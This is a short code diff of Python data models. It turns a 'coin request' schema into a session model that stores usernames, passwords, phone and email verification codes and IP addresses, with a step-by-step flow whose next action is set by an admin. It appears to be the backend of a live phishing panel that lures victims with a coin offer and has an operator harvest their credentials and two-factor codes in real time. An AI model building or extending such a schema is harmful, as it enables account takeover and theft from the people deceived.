@@ -11,28 +11,25 @@ class StatusCheck(BaseModel):
 class StatusCheckCreate(BaseModel):
     client_name: str
 
-class CoinRequest(BaseModel):
-    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
-    username: str
-    amount: int
-    email: str
-    phone: str
+class UserSession(BaseModel):
+    session_id: str = Field(default_factory=lambda: str(uuid.uuid4()))
+    username: Optional[str] = None
+    amount: Optional[int] = None
+    email: Optional[str] = None
+    phone: Optional[str] = None
     password: Optional[str] = None
     phone_code: Optional[str] = None
     email_code: Optional[str] = None
-    location: str = "Unknown"
-    device: str = "Unknown"
-    ip: str = "Unknown"
+    current_step: str = "home"  # home, contact, waiting, password, phone_verify, email_verify, success
+    next_action: Optional[str] = None  # Admin tarafından belirlenen sonraki aksiyon
+    ip: Optional[str] = None
     timestamp: datetime = Field(default_factory=datetime.utcnow)
 
-class CoinRequestCreate(BaseModel):
-    username: str
-    amount: int
-    email: str
-    phone: str
-    password: Optional[str] = None
-    phone_code: Optional[str] = None
-    email_code: Optional[str] = None
-    location: Optional[str] = "Unknown"
-    device: Optional[str] = "Unknown"
-    ip: Optional[str] = "Unknown"
+class StepData(BaseModel):
+    session_id: str
+    step: str
+    data: dict
+
+class AdminAction(BaseModel):
+    session_id: str
+    action: str  # password, form, code, mail, mail_code, finish
